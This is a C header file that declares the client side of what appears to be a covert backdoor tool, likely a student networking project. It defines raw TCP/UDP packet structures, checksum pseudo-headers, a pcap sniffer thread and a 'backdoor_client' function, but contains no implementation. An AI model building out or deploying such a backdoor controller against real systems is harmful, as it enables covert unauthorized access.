/**
 * client.h
 * authors: Shan Bains & Jivanjot Brar
 */

#ifndef CLIENT_H
#define CLIENT_H

#include <pcap.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <pthread.h>
#include <strings.h>

#include "defs.h"

// Globals
pcap_t *pd;
typedef struct _client client;

struct _client {
	unsigned int source_host;
	unsigned int dest_host;
	unsigned short source_port;
	unsigned short dest_port;
	char srchost[80];
	char desthost[80];
};

static struct _packets_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char data[2000];
} packets_tcp;

static struct _packets_udp {
	struct iphdr ip;
	struct udphdr udp;
	char data[2000];
} packets_udp;

static struct _pseudo_header_tcp {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned char tcp_length;
	struct tcphdr tcp;
} pseudo_header_tcp;

static struct _pseudo_header_udp {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short udp_length;
	struct udphdr udp;
} pseudo_header_udp;

client *client_new(void);
void packet_new(client *c, char *msg, char* protocol);
unsigned short in_cksum(unsigned short *addr, int len);
void send_packets(client *c, char *input, char* protocol);
void *sniffer_thread(void *args);
pcap_t * open_pcap_socket(char *device, const char *filter);
void backdoor_client(uint32 srcip, uint32 destip, char* protocol);
void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr,
		u_char *packet);

#endif /* COMMON_H_ */

